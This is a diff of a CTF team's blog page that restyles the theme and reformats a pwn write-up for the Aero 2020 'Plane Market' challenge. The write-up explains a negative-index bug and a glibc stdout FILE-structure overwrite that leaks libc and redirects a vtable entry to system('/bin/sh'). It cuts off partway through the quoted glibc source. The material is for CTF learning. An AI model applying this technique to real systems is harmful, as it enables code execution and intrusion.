         <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF Team</h3>
-        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="fa fa-map-marker"></i> Lisbon, Portugal</small>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Lisbon, Portugal</small>
       </div>
       
       <div class="search" id="search-form-wrap">
@@ -69,23 +74,23 @@
         <div class="input-group">
             <input type="text" class="search-form-input form-control" placeholder="Search" />
             <span class="input-group-btn">
-                <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
             </span>
         </div>
     </form>
     <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
-            <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
-            <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
     </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
 </div>
+
 
 </div>
       <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
@@ -95,14 +100,14 @@
         <span class="icon-bar"></span>
       </button>
     </div>
-    <nav id="main-navbar" class="collapse navbar-collapse">
-      <ul class="nav navbar-nav main-nav">
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
         
         
         <li class="menu-item menu-item-home">
           <a href="/.">
             
-            <i class="fa fa-fw fa-home"></i>
+            <i class="icon icon-home-fill"></i>
             
             <span class="menu-title">Home</span>
           </a>
@@ -112,7 +117,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives">
             
-            <i class="fa fa-fw fa-archive"></i>
+            <i class="icon icon-archives-fill"></i>
             
             <span class="menu-title">Archives</span>
           </a>
@@ -122,7 +127,7 @@
         <li class="menu-item menu-item-categories">
           <a href="/categories">
             
-            <i class="fa fa-fw fa-folder"></i>
+            <i class="icon icon-folder"></i>
             
             <span class="menu-title">Categories</span>
           </a>
@@ -132,19 +137,9 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags">
             
-            <i class="fa fa-fw fa-tags"></i>
+            <i class="icon icon-tags"></i>
             
             <span class="menu-title">Tags</span>
-          </a>
-        </li>
-        
-        
-        <li class="menu-item menu-item-competitions">
-          <a href="/competitions">
-            
-            <i class="fa fa-fw fa-flag"></i>
-            
-            <span class="menu-title">Competitions</span>
           </a>
         </li>
         
@@ -152,47 +147,37 @@
         <li class="menu-item menu-item-about">
           <a href="/about">
             
-            <i class="fa fa-fw fa-users"></i>
+            <i class="icon icon-users"></i>
             
             <span class="menu-title">About</span>
           </a>
         </li>
         
       </ul>
-      <div class="footer">
-	
+      
 	
     <ul class="social-links">
     	
-        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
         
-        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
         
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
         
     </ul>
-    
-    <div class="copyright">
-        &copy; 2022 TEAMROCKETIST
-        <div class="publishby">
-        	<!-- Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
-        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.-->
-        </div>
-    </div>
-</div>
+
     </nav>
   </div>
-</section>
+</header>
 
   
-    <section class="sidebar">
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
   <div class="slimContent">
     
       <div class="widget">
     <h3 class="widget-title">Board</h3>
     <div class="widget-body">
         <div id="board">
-            
             <div class="content">
                 <p>Behind each exploit there is a history of creativity and incredible knowledge.</p>
             </div>
@@ -250,7 +235,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/Android/">Android</a>
               </p>
               <p class="item-title">
                 <a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/" class="title">[Pwn] WMCTF2022 - WM Baby Droid</a>
@@ -265,7 +250,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
               </p>
               <p class="item-title">
                 <a href="/2021/02/08/Pwn-DiceCTF2021-flippidy/" class="title">[Pwn] DiceCTF2021 - flippidy</a>
@@ -295,7 +280,7 @@
             
             <div class="item-inner">
               <p class="item-category">
-                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="fa fa-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
+                <a class="category-link" href="/categories/Pwn/">Pwn</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/Pwn/x64/">x64</a>
               </p>
               <p class="item-title">
                 <a href="/2020/03/23/Pwn-FireShell-CTF-2020-FireHTTPD/" class="title">[Pwn] FireShell CTF 2020 - FireHTTPD</a>
@@ -328,14 +313,15 @@
 
     
   </div>
-</section>
+</aside>
 
   
-  <section class="main">
+  
+<main class="main" role="main">
   <div class="content">
-  <article id="post-Pwn-Aero-2020-Plane-Market" class="article article-type-post" itemscope itemprop="blogPost">
+  <article id="post-Pwn-Aero-2020-Plane-Market" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
-    <header class="article-header">
+    <div class="article-header">
       
         
   
@@ -347,107 +333,137 @@
       
       <div class="article-meta">
         <span class="article-date">
-    <i class="fa fa-calendar-check-o"></i>
+    <i class="icon icon-calendar-check"></i>
 	<a href="/2020/03/01/Pwn-Aero-2020-Plane-Market/" class="article-date">
 	  <time datetime="2020-03-01T15:57:25.000Z" itemprop="datePublished">2020-03-01</time>
 	</a>
 </span>
         
   <span class="article-category">
-    <i class="fa fa-folder"></i>
+    <i class="icon icon-folder"></i>
     <a class="article-category-link" href="/categories/Pwn/">Pwn</a>►<a class="article-category-link" href="/categories/Pwn/x64/">x64</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/">Glibc Malloc</a>►<a class="article-category-link" href="/categories/Pwn/x64/Glibc-Malloc/IO-FILE/">IO_FILE</a>
   </span>
 
         
   <span class="article-tag">
-    <i class="fa fa-tag"></i>
+    <i class="icon icon-tags"></i>
 	<a class="article-tag-link" href="/tags/aero2020/">aero2020</a>, <a class="article-tag-link" href="/tags/file-stream/">file_stream</a>, <a class="article-tag-link" href="/tags/io-file/">io_file</a>, <a class="article-tag-link" href="/tags/io-file-struct/">io_file_struct</a>
   </span>
 
 
         
 
-		
-        <span class="post-comment"><i class="fa fa-commenting-o"></i> <a href="/2020/03/01/Pwn-Aero-2020-Plane-Market/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/03/01/Pwn-Aero-2020-Plane-Market/#comments" class="article-comment-link">Comments</a></span>
         
-		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 2,246 (words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 2,246(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs">Read Time: 14 (min)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 14(minutes)</span>
 	
 
       </div>
-    </header>
-    <div class="article-entry" itemprop="articleBody">
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
       
         <blockquote>
 <p>Plane Market</p>
 </blockquote>
 <blockquote>
-<p><strong>Description</strong>:<br>416pts</p>
+<p><strong>Description</strong>:<br>
+416pts</p>
 <p>Solvers ???</p>
 <p>…</p>
-<p><a href="https://mega.nz/#!C3QEFCoZ!ONfLr_1ZJ-r23-a6OEAthOo97s8423_2QZwvmOymDg8" target="_blank" rel="noopener">plane_market</a> c8052c64cf194d22ca42f0ef4fa6ffc8<br><a href="https://mega.nz/#!m3ZAUQrT!s7ky9fVJZB_r6_o1fQGcjOjCxpYeGu6xvIpSnPrSLks" target="_blank" rel="noopener">libc.so.6</a> 5f4f99671c3a200f7789dbb5307b04bb<br><a href="https://mega.nz/#!SvJizK7A!6roskSJNi163oaq7_Zs_ZWfe1bDLOYYDQzJ0Rh5mV50" target="_blank" rel="noopener">ld-linux-x86-64.so.2</a> 63d339810fe3d20a86e3ff2237e46d89</p>
-<p>nc ctf.pragyan.org 17000</p>
+<p><a href="https://mega.nz/#!C3QEFCoZ!ONfLr_1ZJ-r23-a6OEAthOo97s8423_2QZwvmOymDg8" target="_blank" rel="noopener">plane_market</a> c8052c64cf194d22ca42f0ef4fa6ffc8<br>
+<a href="https://mega.nz/#!m3ZAUQrT!s7ky9fVJZB_r6_o1fQGcjOjCxpYeGu6xvIpSnPrSLks" target="_blank" rel="noopener">libc.so.6</a> 5f4f99671c3a200f7789dbb5307b04bb<br>
+<a href="https://mega.nz/#!SvJizK7A!6roskSJNi163oaq7_Zs_ZWfe1bDLOYYDQzJ0Rh5mV50" target="_blank" rel="noopener">ld-linux-x86-64.so.2</a> 63d339810fe3d20a86e3ff2237e46d89</p>
+<p>nc <a href="http://ctf.pragyan.org" target="_blank" rel="noopener">ctf.pragyan.org</a> 17000</p>
 </blockquote>
-<h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul>
-<li>Use a negative index to change <strong>_IO_2_1_STDOUT_</strong> and execute <strong>IO_OVERFLOW</strong>.</li>
+<h3 id="tldr"><a class="markdownIt-Anchor" href="#tldr"></a> TLDR</h3>
+<ul>
+<li>Use a negative index to change <strong><em>IO_2_1_STDOUT</em></strong> and execute <strong>IO_OVERFLOW</strong>.</li>
 <li>Next <strong>puts</strong> will leak a libc address.</li>
 <li>Repeat 1st step but now change flags field to “/bin/sh\x00” and the <strong>vtable</strong> to <strong>IO_helper_jumps</strong>.</li>
 <li>Change <strong>IO_helper_jumps</strong> IO_OVERFLOW pointer to system.</li>
 <li>Next puts/printf will execute IO_OVEFLOW (fp, EOF) which is now system(fp=/bin/sh).</li>
 </ul>
-<h3 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h3><p>I feel like I ended up using an unintended solution, this binary had a lot more options but I ended up only using the <strong>change_plane_name</strong> function. In the end my solution is based in exploiting the <strong>IO_FILE_STRUCTURE</strong>, by abusing a negative index that allow us to modify <strong>STDOUT</strong>.</p>
-<h3 id="Preparing-the-binary-to-LD-PRELOAD"><a href="#Preparing-the-binary-to-LD-PRELOAD" class="headerlink" title="Preparing the binary to LD_PRELOAD"></a>Preparing the binary to LD_PRELOAD</h3><p>To preload this binary we need to use <strong>patchelf</strong> to use the <strong>ld</strong> given by the challenge:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp plane_market plane_marketbkup</span><br><span class="line">$ patchelf --<span class="built_in">set</span>-interpreter ld-linux-x86-64.so.2 ./plane_marketbkup</span><br></pre></td></tr></table></figure></p>
-<p>Now preloading in the terminal:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=./libc.so.6 ./plane_marketbkup</span><br><span class="line">&#123;?&#125; Enter name: lol</span><br><span class="line">-------- Plane market --------</span><br><span class="line">1. Sell plane</span><br><span class="line">2. Delete plane</span><br><span class="line">3. View sales list</span><br><span class="line">4. View plane</span><br><span class="line">5. Change plane name</span><br><span class="line">6. View profile</span><br><span class="line">7. Exit</span><br><span class="line">&gt; 7</span><br></pre></td></tr></table></figure></p>
-<p>Preloading with pwntools:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=process(filename, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br></pre></td></tr></table></figure></p>
-<h3 id="Binary-analysis"><a href="#Binary-analysis" class="headerlink" title="Binary analysis"></a>Binary analysis</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file plane_market</span><br><span class="line">plane_market: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3a51921137c51149f99313e174755aeb4d8670fc, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br><span class="line"></span><br><span class="line">$ checksec plane_market</span><br><span class="line">[*] <span class="string">'/ctf/aero2020ctf/pwn/PlaneMarket/plane_market'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-<h3 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a>Static analysis</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">change_plane_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#123;?&#125; Enter plane id: "</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == last_plane_id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"&#123;?&#125; Enter new plane name: "</span>);</span><br><span class="line">      result = read_buf(*((<span class="keyword">void</span> **)&amp;plane_list + <span class="number">6</span> * v1), *((_QWORD *)&amp;unk_404100 + <span class="number">6</span> * v1));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = qword_404108[<span class="number">6</span> * v1];</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&#123;?&#125; Enter new plane name: "</span>);</span><br><span class="line">        read_buf(*((<span class="keyword">void</span> **)&amp;plane_list + <span class="number">6</span> * v1), *((_QWORD *)&amp;unk_404100 + <span class="number">6</span> * v1));</span><br><span class="line">        result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1;</span><br><span class="line">        last_plane_id = v1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"&#123;-&#125; Error id!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="challenge"><a class="markdownIt-Anchor" href="#challenge"></a> Challenge</h3>
+<p>I feel like I ended up using an unintended solution, this binary had a lot more options but I ended up only using the <strong>change_plane_name</strong> function. In the end my solution is based in exploiting the <strong>IO_FILE_STRUCTURE</strong>, by abusing a negative index that allow us to modify <strong>STDOUT</strong>.</p>
+<h3 id="preparing-the-binary-to-ld_preload"><a class="markdownIt-Anchor" href="#preparing-the-binary-to-ld_preload"></a> Preparing the binary to LD_PRELOAD</h3>
+<p>To preload this binary we need to use <strong>patchelf</strong> to use the <strong>ld</strong> given by the challenge:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp plane_market plane_marketbkup</span><br><span class="line">$ patchelf --<span class="built_in">set</span>-interpreter ld-linux-x86-64.so.2 ./plane_marketbkup</span><br></pre></td></tr></table></figure>
+<p>Now preloading in the terminal:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=./libc.so.6 ./plane_marketbkup</span><br><span class="line">&#123;?&#125; Enter name: lol</span><br><span class="line">-------- Plane market --------</span><br><span class="line">1. Sell plane</span><br><span class="line">2. Delete plane</span><br><span class="line">3. View sales list</span><br><span class="line">4. View plane</span><br><span class="line">5. Change plane name</span><br><span class="line">6. View profile</span><br><span class="line">7. Exit</span><br><span class="line">&gt; 7</span><br></pre></td></tr></table></figure>
+<p>Preloading with pwntools:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=process(filename, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br></pre></td></tr></table></figure>
+<h3 id="binary-analysis"><a class="markdownIt-Anchor" href="#binary-analysis"></a> Binary analysis</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file plane_market</span><br><span class="line">plane_market: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3a51921137c51149f99313e174755aeb4d8670fc, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br><span class="line"></span><br><span class="line">$ checksec plane_market</span><br><span class="line">[*] <span class="string">'/ctf/aero2020ctf/pwn/PlaneMarket/plane_market'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<h3 id="static-analysis"><a class="markdownIt-Anchor" href="#static-analysis"></a> Static analysis</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">change_plane_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#123;?&#125; Enter plane id: "</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == last_plane_id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"&#123;?&#125; Enter new plane name: "</span>);</span><br><span class="line">      result = read_buf(*((<span class="keyword">void</span> **)&amp;plane_list + <span class="number">6</span> * v1), *((_QWORD *)&amp;unk_404100 + <span class="number">6</span> * v1));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = qword_404108[<span class="number">6</span> * v1];</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&#123;?&#125; Enter new plane name: "</span>);</span><br><span class="line">        read_buf(*((<span class="keyword">void</span> **)&amp;plane_list + <span class="number">6</span> * v1), *((_QWORD *)&amp;unk_404100 + <span class="number">6</span> * v1));</span><br><span class="line">        result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1;</span><br><span class="line">        last_plane_id = v1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"&#123;-&#125; Error id!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>The vulnerability is here, there isn’t a check for negative indexes.</p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>By editing the <strong>-2</strong> index things will be aligned with the <strong>stdout</strong> and <strong>stderr</strong> pointers in the BSS. </p>
-<p>In the end the size filed of “<strong>read</strong>“ will be part of the stderr pointer and the pointer of <strong>stdout</strong> will be the <strong>buf</strong> to be edited:<br><a data-fancybox="gallery" href="https://i.imgur.com/BHVaAKq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/BHVaAKq.png" alt><br></a></p>
+<h3 id="exploit"><a class="markdownIt-Anchor" href="#exploit"></a> Exploit</h3>
+<p>By editing the <strong>-2</strong> index things will be aligned with the <strong>stdout</strong> and <strong>stderr</strong> pointers in the BSS.</p>
+<p>In the end the size filed of “<strong>read</strong>” will be part of the stderr pointer and the pointer of <strong>stdout</strong> will be the <strong>buf</strong> to be edited:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/BHVaAKq.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/BHVaAKq.png" alt><br>
+</a></p>
 <p>The first edit is to make <strong>printf/puts</strong> to leak a libc address the way we can do this is by changing the <strong>STDOUT</strong> file structure to meet this conditions:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IO_2_1_stdout-&gt;file-&gt;_flags = <span class="number">0xfbad1800</span> </span><br><span class="line">IO_2_1_stdout-&gt;file-&gt;_IO_read_ptr = <span class="number">0x0</span> </span><br><span class="line">IO_2_1_stdout-&gt;file-&gt;_IO_read_end = <span class="number">0x0</span></span><br><span class="line">IO_2_1_stdout-&gt;file-&gt;_IO_read_base = <span class="number">0x0</span></span><br><span class="line">IO_2_1_stdout-&gt;file-&gt;_IO_write_base; <span class="comment">//modify last byte with 0xa or 0x0</span></span><br></pre></td></tr></table></figure>
 <p>To get the libc source code of this version we can get the source from glibc git and change to the correct branch:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc.so.6 | grep <span class="string">'glibc'</span></span><br><span class="line">glibc 2.29</span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Fatal glibc error: array index %zu not less than array length %zu</span><br><span class="line">Fatal glibc error: invalid allocation buffer of size %zu</span><br><span class="line"></span><br><span class="line">$ git <span class="built_in">clone</span> git://sourceware.org/git/glibc.git</span><br><span class="line">Cloning into <span class="string">'glibc'</span>...</span><br><span class="line">remote: Enumerating objects: 580861, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (580861/580861), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (77106/77106), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 580861 (delta 492799), reused 580285 (delta 492341)</span><br><span class="line">Receiving objects: 100% (580861/580861), 175.11 MiB | 1.63 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (492799/492799), <span class="keyword">done</span>.</span><br><span class="line">Updating files: 100% (17361/17361), <span class="keyword">done</span>.</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> glibc</span><br><span class="line"></span><br><span class="line">$ git checkout release/2.29/master</span><br><span class="line">Updating files: 100% (12744/12744), <span class="keyword">done</span>.</span><br><span class="line">Branch <span class="string">'release/2.29/master'</span> <span class="built_in">set</span> up to track remote branch <span class="string">'release/2.29/master'</span> from <span class="string">'origin'</span>.</span><br><span class="line">Switched to a new branch <span class="string">'release/2.29/master'</span></span><br></pre></td></tr></table></figure>
-<p>And why ? “puts” internally calls <strong>_IO_new_file_xsputn</strong> which eventually calls <strong>IO_OVERFLOW</strong>.<br>Examining <strong>IO_OVERFLOW</strong> which its function is denoted by <strong>_IO_new_file_overflow</strong> and located at <strong>glibc/libio/fileops.c</strong>:</p>
+<p>And why ? “puts” internally calls <strong>_IO_new_file_xsputn</strong> which eventually calls <strong>IO_OVERFLOW</strong>.<br>
+Examining <strong>IO_OVERFLOW</strong> which its function is denoted by <strong>_IO_new_file_overflow</strong> and located at <strong>glibc/libio/fileops.c</strong>:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno 